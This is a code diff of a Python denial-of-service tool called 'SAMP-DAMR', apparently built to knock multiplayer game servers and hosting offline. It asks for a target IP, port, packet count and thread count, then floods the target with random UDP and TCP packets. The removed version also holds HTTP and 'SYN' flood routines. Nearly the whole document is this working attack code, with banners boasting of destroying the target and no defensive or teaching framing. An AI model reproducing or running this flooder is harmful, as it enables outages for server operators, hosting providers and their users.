@@ -1,4 +1,3 @@
-#AUTHOR SAMP DAMARZ
 import random
 import socket
 import threading
@@ -6,121 +5,90 @@ import os
 import sys
 import time
 
+###### SAMP-DAMR ON TOP! #####
 os.system("clear")
-print("\u001B[31m🔥 Welcome to SAMP-DAMARZ World 🔥")
-time.sleep(1)
-print("\u001B[35mLoading Super Attack...")
+print("\u001b[35m Welcome to SAMP-DAMR World")
+time.sleep(2)
+print("Loading powerful attack engine.......")
 os.system("clear")
 
 print("""
-\u001B[31m
-    ██████╗██╗  ██╗███████╗    ██╗    ██╗███████╗███╗   ███╗███████╗
-    ██╔══██╗██║  ██║██╔════╝    ██║    ██║██╔════╝████╗ ████║██╔════╝
-    ██████╔╝███████║█████╗      ██║ █╗ ██║█████╗  ██╔████╔██║█████╗  
-    ██╔══██╗██╔══██║██╔══╝      ██║███╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  
-    ██║  ██║██║  ██║███████╗    ╚███╔███╔╝███████╗██║ ╚═╝ ██║███████╗
-    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝     ╚══╝╚══╝ ╚══════╝╚═╝     ╚═╝╚══════╝ V 2.1
-\u001B[35m    AUTHOR: SAMP DAMARZ - TEMBUS HOSTING PROTECTION! 💀🔥
+\u001b[35m
+	  SAMP-DAMR ULTIMATE TOOL
+	╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
+	╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
+	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 2.0
+          DAMR - Destroy All Multiplayer Realms
 """)
 
-ip = input("\u001B[31mTarget IP: \u001B[37m")
-port = int(input("\u001B[31mTarget Port: \u001B[37m"))
-choice = input("\u001B[31mUDP Flood? (y/n): \u001B[37m")
-times = int(input("\u001B[31mPacket Rate: \u001B[37m"))
-threads = int(input("\u001B[31mThreads (max 1000): \u001B[37m"))
+ip = str(input(" Target IP : "))
+port = int(input(" Target Port (usually 7777) : "))
+choice = str(input(" Use Multi-Vector Attack? (y/n) : ")).lower()
+times = int(input(" Packets per thread : "))
+threads = int(input(" Number of Threads : "))
 
-def attack_udp():
+def run_udp():
+    data = random._urandom(random.randint(512, 2048))  # Random besar payload
+    i = random.choice(("[*]","[!]","[#]","[DAMR]","[DESTROY]"))
     while True:
-        data = random._urandom(65507)
-        i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr = (ip, port)
-            for _ in range(times):
+            addr = (str(ip), int(port))
+            for x in range(times):
                 s.sendto(data, addr)
-                s.sendto(data, addr)
-            print(i + " UDP FLOOD - BYPASS PROTECTION!")
+            print(i + " UDP Flood Sent!!!")
         except:
-            pass
+            print("[!] UDP Error - Continuing...")
 
-def attack_tcp():
+def run_tcp():
+    data = random._urandom(random.randint(512, 4096))
+    i = random.choice(("[*]","[!]","[#]","[DAMR]","[DESTROY]"))
     while True:
-        data = random._urandom(1024)
-        i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(data * random.randint(10, 30))
-            print(i + " TCP OVERLOAD - HOSTING DOWN!")
-        except:
-            try:
-                s.close()
-            except:
-                pass
-
-def attack_http():
-    while True:
-        headers = "GET / HTTP/1.1
-Host: " + ip + "
-User-Agent: Mozilla/5.0
-
-"
-        data = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=2000))
-        i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, 80 if port == 80 else port))
-            s.send(headers.encode())
-            s.send(data.encode())
-            print(i + " HTTP FLOOD - WEB CRASH!")
-        except:
-            try:
-                s.close()
-            except:
-                pass
-
-def attack_syn():
-    while True:
-        data = random._urandom(1024)
-        i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)
             s.connect((ip, port))
             s.send(data)
-            print(i + " SYN FLOOD - CONNECTION FLOOD!")
+            for x in range(times):
+                s.send(data)
+            print(i + " TCP Flood Sent!!!")
+            s.close()
         except:
-            try:
-                s.close()
-            except:
-                pass
+            print("[*] TCP Error - Retrying...")
 
-print("\u001B[31m🚀 ATTACK STARTED - DAMARZ ULTRA MODE! 🚀")
-print("\u001B[35mPress Ctrl+C to stop...
-")
+def run_mixed():
+    data = random._urandom(random.randint(256, 3072))
+    i = random.choice(("[*]","[!]","[#]","[DAMR]","[DESTROY]"))
+    while True:
+        try:
+            # Mix UDP + small TCP
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip), int(port))
+            s.sendto(data, addr)
+            s.close()
+            
+            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s2.connect((ip, port))
+            s2.send(data)
+            s2.close()
+            print(i + " Mixed Vector Attack Sent!!!")
+        except:
+            print("[!] Mixed Error - Continuing...")
+
+print("\u001b[31m[ATTACK STARTING] SAMP-DAMR is now destroying the target...\u001b[0m")
+time.sleep(1)
 
 for y in range(threads):
-    t1 = threading.Thread(target=attack_udp)
-    t1.daemon = True
-    t1.start()
-    
-    t2 = threading.Thread(target=attack_tcp)
-    t2.daemon = True
-    t2.start()
-    
-    if choice.lower() == 'y':
-        t3 = threading.Thread(target=attack_http)
-        t3.daemon = True
-        t3.start()
-        t4 = threading.Thread(target=attack_syn)
-        t4.daemon = True
-        t4.start()
+    if choice == 'y':
+        # Multi-vector mode (lebih gacor)
+        th1 = threading.Thread(target=run_udp)
+        th1.start()
+        th2 = threading.Thread(target=run_tcp)
+        th2.start()
+        th3 = threading.Thread(target=run_mixed)
+        th3.start()
+    else:
+        # Basic powerful UDP only
+        th = threading.Thread(target=run_udp)
+        th.start()
 
-print("\u001B[31m💀 SAMP DAMARZ V2.1 - 100% HOSTING KILLER! 💀\u001B[37m")
-
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("
-\u001B[31mAttack Stopped by User!\u001B[37m")
+print("\u001b[32mAttack Launched Successfully! All threads active. Press Ctrl+C to stop.\u001b[0m")
